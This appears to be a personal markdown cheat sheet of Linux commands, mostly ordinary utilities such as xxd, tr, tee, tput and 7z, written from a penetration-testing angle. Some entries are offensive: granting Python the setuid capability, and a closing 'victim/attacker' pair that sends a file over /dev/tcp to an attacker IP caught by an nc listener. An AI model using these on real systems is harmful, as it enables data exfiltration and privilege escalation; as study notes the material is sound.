`grep -oP` --> 
`pwdx` --> You can se where the process it executed, **pwdx 12345**
`sudo python3 -m http.server 80` --> Create a web server in port 80 (http)
`awk '{print $2}'` --> Only print the second argument
`xxd -ps -r` --> Transform the hexadecimal code in human legible
`sort -u` --> To show unique string
`exec` --> Execute commands in the same process and don't create a new sub-process to execute the command.
The process of bash depend of the command, if you put this in your terminal, this close at 10 seconds
````bash
exec sleep 10
````
In a bash file the process of the executing file is the same but they are executing the next command to exec.

### Capabilities
`getcap -r / 2>/dev/null` --> To see the files or programs with capabilities
`sudo setcap cap_setuid+ep /usr/bin/python3.9` --> Active the capability to control that permit change the UID
`sudo setcap -r /usr/bin/python.3.9` --> To remove the capability
http://www.etl.it.uc3m.es/Linux_Capabilities

### Reduce size of go files

`du -hc gobuster` --> To see the size of the file
`go build -ldflags "-s -w" .` --> This reduce the size
`upx gobuster` --> It is a utility that reduce the size of the file


`sudo -l` --> You can see the command that can execute the user, **if the user can use this command means that this user have the privilege of sudo **

`lsof -i:80` --> To see if some service is using this port | -i (internet)

``svn checkout https://github.com/vulhub/vulhub/trunk/kibana/CVE-2018-17246`` --> (Subversion) To download a subrepo or a folder. Is important to **replace the tree/master with trunk**

``pushd`` --> It's like cd but remember the route where you were in the command **popd**

``popd`` --> When you put this command if you use pushd previously this go to the route saved. (cd to the back route)


`tput civis` --> To hide the cursor
`tput cnorm` --> To seet he cursor

`tty` --> To see if the terminal is a [tty](https://www.geeksforgeeks.org/tty-command-in-linux-with-examples/)

`echo -n 'hola' | md5sum` --> Convert the String in md5 format

`echo "set -g mouse on" >> ~/.tmux.conf` --> allow you to use the scroll of the mouse

`tee` --> is used to create files with the content of first command, e.x :**ls | tee files.txt**

`tee -a` --> With -a don't delete the data that is in the file indicated

`sponge` --> avoid the problems with the redirection, example:
this generate problems `command1 | command2 > archivo.txt` or sometimes when use tee but you can use sponge `command1 | sponge archivo.txt`. 


`dirname` --> Obtain the directory indicate a file

`uniq` --> Don't show the repeat words

`cat data.txt | tr '[G-ZA-Fg-za-f]' '[T-ZA-St-za-s]'` --> To rotate the characters with tr (remember you can use the website rot13.com)

Or you can do this:
`cat data.txt | tr '[A-Za-z]' '[N-ZA-Mn-za-m]'` --> The character number 13 in the alphabet is the N

`xxd` --> See the data of files in hexadecimal

`xxd -ps` --> **Plain, Simple** If you only want to see the hexadecimal numbers 

``xxd -r`` --> **Reverse** To transform in clear text

`ghex` --> Graphical hex editor where you can manipulate binary data in hexadecimal format

### Compress files, zip, gz...

`gunzip` --> To unzip gz zips

`7z l file.gz ` --> To list the files that are inside the compressed file 

`7z x file.gz` --> Extract the content **independently the compressed type**

----

## Install pip2

````bash
curl https://bootstrap.pypa.io/pip/2.7/get-pip.py --output get-pip.py
sudo python2 get-pip.py
pip2 --version
````

----


`xclip -sel clip` --> You can use this to copy the output of a file, e.x --> **cat data | xclip -sel clip**

or you can use this:

`cat archivo.txt | xclip -selection clipboard`


See a file in other computer
````bash
# Victim machine
cat < index.php > /dev/tcp/172.21.7.214/443

# Attacker machine
sudo nc -nlvp 443 | cat -l php
````